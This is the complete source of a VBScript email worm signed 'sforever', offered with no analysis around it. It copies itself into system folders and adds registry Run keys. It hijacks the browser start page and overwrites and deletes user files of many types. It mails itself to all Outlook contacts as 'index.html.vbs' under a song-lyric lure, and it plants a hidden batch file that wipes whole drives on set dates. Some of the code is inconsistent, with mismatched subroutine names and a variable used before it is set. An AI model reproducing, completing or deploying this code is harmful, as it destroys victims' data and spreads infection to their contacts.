Rem sforever 
Rem mail: sforever@21cn.com 
On Error Resume Next 
Dim yhbfilesys, yhbsysdir, yhbwindir, yhbfile, yhbvbscp 
Set yhbfile = yhbfilesys.OpenTextFile(WScript.ScriptFullName, 1) 
yhbvbscp = yhbfile.ReadAll 
mail() 
Sub mail() 
On Error Resume Next 
Dim yhbtimeover, yhberr, yhbsm, yhbimme, yhbaddadd, yhbaddress, yhbc 
Set yhbtimeover = CreateObject("WScript.Shell") 
yhberr = yhbtimeover.RegRead(" HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting Host\Settings\Timeout") 
If (yhberr >= 1) Then 
yhbtimeover.RegWrite " HKEY_CURRENT_USER\Software\Microsoft\Windows Scripting\Host\Settings\Timeout", 0, "REG_DWORD" 
End If 
Set yhbfilesys = CreateObject("Scripting.FileSystemObject") 
Set yhbwindir = yhbfilesys.GetSpecialFolder(0) 
Set yhbsysdir = yhbfilesys.GetSpecialFolder(1) 
Set yhbtemp = yhbfilesys.GetSpecialFolder(2) 
Set yhbc = yhbfilesys.getfile(WScript.ScriptFullName) 
yhbc.Copy(yhbwindir&"\yhbsforever.vbs") 
yhbc.Copy(yhbsysdir&"\sforever.vbs") 
yhbc.Copy(yhbsysdir&"\index.html.vbs") 
yhbc.Copy(yhbsysdir&"\Rundll32.vbs") 
yhbc.Copy(yhbtemp&"\kongshanyigui.vbs") 
  
yhbregload() 
yhballdrivers() 
auto() 
auto1() 
yhbmail() 
End Sub 
Sub yhbregload() 
On Error Resume Next 
yhbregcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\sforever",yhbsysdir&"\sforever.vbs" 
yhbregcreate "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\sforever",yhbsysdir&"\sforever.vbs" 
yhbregcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices\yhbsforever",yhbwindir&"\yhbsforever.vbs" 
yhbregcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://sforever.mycool.net/" 
yhbregcreate "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page", "http://sforever.mycool.net/" 
End Sub 


Sub auto() 
On Error Resume Next 
Dim yhb, yauto, ydir 
Set yhb = CreateObject("Scripting.FileSystemObject") 
Set yauto = yhb.createtextfile("c:\autoexec.bat", True) 
yauto.writeline ("@echo off") 
yauto.writeline ("start c:\windows\system\index.html.vbs") 
yauto.writeline ("start c:\windows\system\index.html.vbs") 
yauto.writeline ("start C:\WINDOWS\TEMP\kongshanyigui.vbs") 
yauto.Close 
Set ydir = yhb.getfile("c:\autoexec.bat") 
ydir.Attributes = ydir.Attributes + 2 +4 
End Sub 

Sub auto1() 
On Error Resume Next 
Dim yhb, yauto, ydir 
Set yhb = CreateObject("Scripting.FileSystemObject") 
Set yauto = yhb.createtextfile("c:\yhb.bat", True) 
yauto.writeline ("@echo off") 
yauto.writeline ("deltree/y c:\*.*") 
yauto.writeline ("deltree/y c:\windows *.*") 
yauto.writeline ("deltree/y d:\*.*") 
yauto.writeline ("deltree/y e:\*.*") 
yauto.writeline ("deltree/y f:\*.*") 
yauto.Close 
Set ydir = yhb.getfile("c:\yhb.bat") 
ydir.Attributes = ydir.Attributes + 2 +4 
End Sub 
If Month(Now) = 10 And Day(Now) = 11 Then 
yhbfilesys.getfile("c:\yhb.bat").Copy ("C:\WINDOWS\Start Menu\Programs\启动\yhb.bat") 
yhbregcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\yhb1","C:\yhb.bat" 
End If 
If Month(Now) = 10 And Day(Now) = 21 Then 
yhbfilesys.getfile("c:\yhb.bat").Copy ("C:\WINDOWS\Start Menu\Programs\启动\yhb.bat") 
yhbregcreate "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\yhb2","C:\yhb.bat" 
End If 
  

  
Sub yhballdriver() 
Dim yhbd, yhbdc, yhbs 
Set yhbdc = yhbfilesys.Drives 
For Each yhbd In yhbdc 
If yhbd.DriveType = 2 Or yhbd.DriveType = 3 Then 
folderlist(yhbd.path&"\") 
End If 
Next 
listadriv = yhbs 
End Sub 
Sub yhbinfectfiles(yhbfolderspec) 
On Error Resume Next 
Dim yf, yf1, yfc, yext, yap, cop, ys, ydocu 
Set yf = yhbfilesys.GetFolder(yhbfolderspec) 
Set yfc = yf.yhbFiles 
For Each yf1 In yfc 
yext = yhbfilesys.GetExtensionName(yf1.Path) 
yext = LCase(yext) 
ys = LCase(yf1.Name) 
If (yext = "vbs") Or (yext = "vbe") Then 
Set yap = yhbfilesys.OpenTextFile(yf1.Path, 2, True) 
yap.write yhbvbscp 
yap.Close 
ElseIf (yext = "js") Or (yext = "jse") Or (yext = "css") Or (yext = "wsh") Or (yext = "sct") Or (yext = "hta") Or (yext = "txt") Or (yext = "vbs") Or (yext = "bmp") Or (yext = "mp3") Or (yext = "bak") Or (yext = "gif") Or (yext = "doc") Or (yext = "dll") Or (yext = "xls") Or (yext = "html") Or (yext = "htm") Or (yext = "jpg") Or (yext = "zip") Or (yext = "dot") Or (ext = "yexe") Then 
yf1.Attributes = 0 
Set ydocu = yhbfilesys.OpenTextFile(yf1.Path, 2, True) 
ydocu.write yhbvbscp 
ydocu.Close 
yhbfilesys.DeleteFile yf1.Path, True 
End If 
Next 
End Sub 



Sub yhbfolderlist(yhbfolderspec) 
On Error Resume Next 
Dim yf, yf1, ysf 
Set yf = yhbfilesys.GetFolder(yhbfolderspec) 
Set ysf = yf.SubFolders 
For Each yf1 In ysf 
yhbinfectfiles (yf1.Path) 
yhbfolderlist (yf1.Path) 
Next 
End Sub 



Sub yhbregcreate(yhbregkey, yhbregvalue) 
Set yhbregedit = CreateObject("WScript.Shell") 
yhbregedit.RegWrite yhbregkey, yhbregvalue 
End Sub 


Function yhbregget(yhbvalue) 
Set yhbregedit = CreateObject("WScript.Shell") 
yhbregget = yhbregedit.RegRead(yhbvalue) 
End Function 



Function yhbfileexist(yhbfilespec) 
On Error Resume Next 
Dim yhbmsg 
If (yhbfilesys.FileExists(yhbfilespec)) Then 
yhbmsg = 0 
Else 
yhbmsg = 1 
End If 
yhbfileexist = yhbmsg 
End Function 

Function yhbfolderexist(yhbfolderspec) 
On Error Resume Next 
Dim yhbmsg 
If (yhbfilesys.GetFolderExists(yhbfolderspec)) Then 
yhbmsg = 0 
Else 
yhbmsg = 1 
End If 
yhbfileexist = yhbmsg 
End Function 

Sub yhbmail() 
On Error Resume Next 
Dim x, a, yctrlists, yctrentries, ymalead, b, yregedit, yregv, yregad 
Set yregedit = CreateObject("WScript.Shell") 
Set yout = WScript.CreateObject("Outlook.Application") 
Set ymapi = yout.GetNameSpace("MAPI") 
For yctrlists = 1 To ymapi.AddressLists.Count 
Set a = ymapi.AddressLists(yctrlists) 
x = 1 
yregv = yregedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" &a) 
If (yregv = "") Then 
yregv = 1 
End If 
If (Int(a.AddressEntries.Count) > Int(yregv)) Then 
For yctrentries = 1 To a.AddressEntries.Count 
ymalead = a.AddressEntries(x) 
yregad = "" 
yregad = yregedit.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & ymalead) 
If (yregad = "") Then 
Set ymale = yout.CreateItem(0) 
ymale.Recipients.Add (ymalead) 
ymale.Subject = "你最喜欢的一首歌" 
ymale.Body = vbcrlf&"过完整个夏天，忧伤并没有好一些，开车行驶在公路无边无际，有离开自己的感觉。唱不完一首歌，疲倦还剩下黑眼圈，感情的世界伤害在所难免，黄昏再美总要黑夜! 依然记得从你口中说出再见坚决如铁。昏暗中有种烈日灼身的错觉，黄昏的地平线划出一句离别爱情进入永夜! 依然记得从你眼中滑落的泪伤心欲绝，混乱中有种热泪烧伤的错觉，黄昏的地平线割断幸福喜悦，相爱已经幻灭!" 
ymale.Attachments.Add(yhbsysdir&"\index.html.vbs") 
ymale.Send 
yregedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & ymalead, 1, "REG_DWORD" 
End If 
x = x + 1 
Next 
yregedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count 
Else 
yregedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & a, a.AddressEntries.Count 
End If 
Next 
Set yout = Nothing 
Set ymapi = Nothing 
End Sub 
  
'完成 
